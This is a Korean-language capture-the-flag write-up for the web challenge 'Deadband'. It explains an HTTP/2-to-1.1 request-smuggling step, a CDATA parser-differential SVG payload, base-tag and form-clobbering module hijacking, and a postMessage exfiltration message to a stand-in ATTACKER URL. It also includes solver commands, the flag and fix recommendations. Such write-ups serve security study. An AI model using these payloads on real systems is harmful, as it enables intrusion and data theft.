# UHCON 2026 Final — Deadband 풀이

## 결과

- 문제: Deadband (challenge id 2)
- 분류: Web
- 플래그:

```text
FLAG{2dd4d65661a2916ac847a2211cbf5485a390a9076ed39e4c099c719a0508649d5e40e0b2c5b73c0bed07f1ef8b71d842576f7ee74727b8d5d9b0e940019c3007}
```

- 플랫폼 검증: `solved_by_me=true`
- 해결 시각: `2026-11-07T05:46:24.870721Z`

## 취약점 요약

Deadband는 서로 다른 세 신뢰 경계가 연쇄적으로 깨진 문제였다.

1. H2 edge가 중복 `Content-Length`를 포함한 `/ingest/ping` 요청을 origin의
   HTTP/1.1 연결에 전달하면서, 본문 뒤의 요청을 두 번째 내부 요청으로
   처리한다.
2. legacy SVG 조각을 XML로 검사한 뒤 HTML로 재채택하는 과정에서
   `CDATA` 안의 비활성 문자열이 실제 HTML 요소로 되살아난다.
3. 늦게 생성된 `<base>`와 첫 번째 `review-policy` form이 manifest loader를
   외부 origin으로 돌리고, 외부 모듈이 confidential review context에
   `evidence-receipt` 메시지를 전달한다.

즉, 요청 경계 혼동으로 내부 review API에 접근한 뒤, XML/HTML 파서 차이와
late DOM materialization을 이용해 리뷰 브라우저에서 신뢰된 모듈을 실행하는
체인이다.

## 1. H2 → H1 ordered response shift

단일 H2 stream의 carrier 안에 다음 HTTP/1.1 요청을 삽입했다.

- `POST /internal/review/prepare`
- `POST /internal/review/enqueue`

carrier 하나는 origin 응답을 두 개 만들지만 H2 exchange 하나는 응답 하나만
소비한다. 남은 응답은 동일 세션의 다음 exchange로 이동한다. 새 세션에서의
정확한 순서는 다음과 같다.

```text
E1 carrier(prepare)  -> outer 200, queue=[prepare 103+201]
E2 plain drain       -> prepare 응답과 48-hex review ticket 회수
E3 carrier(enqueue)  -> E2의 plain 200
E4 plain drain       -> enqueue outer 200
E5 plain drain       -> enqueue inner 202 queued
```

prepare 응답은 일반적인 H2 형태가 아니었다. informational `103`의 `Link`에
ticket 앞 24 hex가 있고, DATA 안의 raw HTTP/1.1 `201` trailer
`X-Review-Ticket-Suffix`에 뒤 24 hex가 있었다. 따라서 수동 frame/HPACK
파서인 `agent2_h2_ordered_exchange.py`로 두 부분을 합쳤다.

최종 실행은 fresh user/report/session을 사용했으며 E1~E5와 report id를 모두
교차 검증했다. enqueue 뒤 상태는 `reviewing -> reviewed`였다.

## 2. XML 검사에는 보이지 않는 overlay

최종 `operator_note`의 핵심은 아래 구조다.

```xml
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject>
  <div xmlns="http://www.w3.org/1999/xhtml"><![CDATA[>
    <template data-review-overlay="">
      <base href="https://ATTACKER/base-TAG@reviewer">
      <form id="review-policy" name="review-policy">
        <input id="manifest" name="manifest"
               value="/evidence/modules/default.js">
      </form>
      <img src="https://ATTACKER/deadband-combined-canary-TAG@reviewer">
      <img src="/deadband-base-canary-TAG@reviewer">
    </template>
  ]]></div>
</foreignObject></svg>
```

이 SVG 전체를 `<code data-evidence-fragment="legacy">`의 escaped text로
전달했다.

XML 단계에서 보이는 element는 `svg`, `foreignObject`, XHTML `div` 세 개뿐이다.
`template`, `base`, `form`, `input`, `img`는 모두 CDATA 문자열이라 active-node
sweep 대상이 아니다. 그러나 직렬화된 조각을 `text/html`로 다시 파싱하면
`<![CDATA[`가 bogus comment로 처리되고 바로 뒤의 `>`가 이를 닫는다. 뒤의
문자열은 실제 `HTMLTemplateElement`가 된다.

review pipeline의 overlay materialization 단계가 template content를 live DOM에
복제하면서 숨겨진 요소들이 활성화된다.

## 3. late base + retained default manifest

materialization 후 두 image canary가 각각 다른 조건을 증명했다.

- 절대 URL canary: 숨겨진 overlay가 live DOM에 들어왔음
- `/deadband-base-canary-...`: 늦게 생성된 `<base>`가 document base를 바꿨음

첫 번째 form은 이름과 id가 모두 `review-policy`이고, manifest control 값은
문서에 공개된 retained compatibility module인
`/evidence/modules/default.js`다. 이 상대 경로는 late base 때문에 다음 외부
URL로 해석됐다.

```text
https://ATTACKER/evidence/modules/default.js
```

Webhook.site는 경로별 응답이 404여서 module body가 있어도 브라우저가 실행을
거부했다. 따라서 최종 실행에서는 전용 HTTPS receiver가 정확히 다음 응답을
반환하도록 했다.

```text
HTTP 200
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *
```

## 4. confidential context bridge

외부 모듈은 먼저 execution beacon을 만들고, 다음 메시지를 `window`, `parent`,
`top` 및 각 root의 child frame에 반복 전송했다.

```javascript
{
  type: "evidence-receipt",
  return_to: "https://ATTACKER/deadband-cdata-receipt-TAG@reviewer"
}
```

관찰 순서는 다음과 같았다.

1. absolute canary GET
2. base-relative canary GET
3. `/evidence/modules/default.js` GET (`Sec-Fetch-Dest: script`)
4. `deadband-module-executed-...` GET
5. `/context-receipt?d=...` GET

마지막 요청의 `d`는 Base64였다. URL decode 후 Base64 decode하면 위 플래그가
나왔다. 요청 UA는 HeadlessChrome 156이었고, review page referer는
`http://127.0.0.1:9970/`, confidential context referer는
`http://127.0.0.1:9971/`이었다.

## 재현 방법

필요 파일:

- `solve_deadband_final.py`: 최종 solver 진입점
- `root_deadband_cdata_manifest_chain.py`: payload 생성, E1~E5, callback 파싱
- `agent2_h2_ordered_exchange.py`: 단일-stream H2 carrier/plain primitive
- `root_deadband_final_receiver.js`: 200 JavaScript receiver
- `deadband_submit_flag.py`: challenge 2 제출 및 `solved_by_me` 재검증

1. receiver를 실행하고 public HTTPS tunnel로 local port를 노출한다.
2. receiver와 solver에 동일한 12-hex tag를 준다.
3. bare HTTPS origin과 receiver JSONL log를 solver에 전달한다.

```powershell
$env:DEADBAND_FINAL_PORT = '8766'
$env:DEADBAND_FINAL_TAG = '0123456789ab'
$env:DEADBAND_FINAL_LOG = 'receiver.jsonl'
node .\root_deadband_final_receiver.js

python -B .\solve_deadband_final.py `
  --probe-origin https://PUBLIC_HTTPS_ORIGIN `
  --receiver-log .\receiver.jsonl `
  --tag 0123456789ab `
  --prefix deadband_final
```

solver는 receiver log의 `/context-receipt?d=...`를 URL/Base64 decode하고
`FLAG{...}`를 `flag.txt`에 저장한다. 제출은 다음과 같이 수행한다.

```powershell
python -B .\deadband_submit_flag.py --submit
```

## 최종 증거 파일

- `root_deadband_final_retained_200_20261107_summary.json`
- `root_deadband_final_retained_200_20261107_local_validation.json`
- `root_deadband_final_retained_200_20261107_E1_prepare_carrier.json`
- `root_deadband_final_retained_200_20261107_E2_ticket_drain.json`
- `root_deadband_final_retained_200_20261107_E3_enqueue_carrier.json`
- `root_deadband_final_retained_200_20261107_E4_drain.json`
- `root_deadband_final_retained_200_20261107_E5_drain.json`
- `root_deadband_shared_final_receiver_requests.jsonl`
- `deadband_submission_result.json`

## 수정 권고

- edge에서 중복 `Content-Length`를 거부하고 H2→H1 변환 후 요청 수를 검증한다.
- 내부 review API를 별도 인증 채널로 분리하고 edge-origin connection을 공유하지
  않는다.
- SVG를 XML과 HTML로 교차 재해석하지 말고, 최종 materialization 직전의 DOM을
  동일 정책으로 다시 sanitize한다.
- `<base>`, form clobbering 요소, template/iframe/script 및 외부 module URL을
  제거하거나 allowlist한다.
- confidential frame의 `message` handler는 origin, source, nonce를 모두
  검증하고 attacker-controlled return URL로 secret을 보내지 않는다.
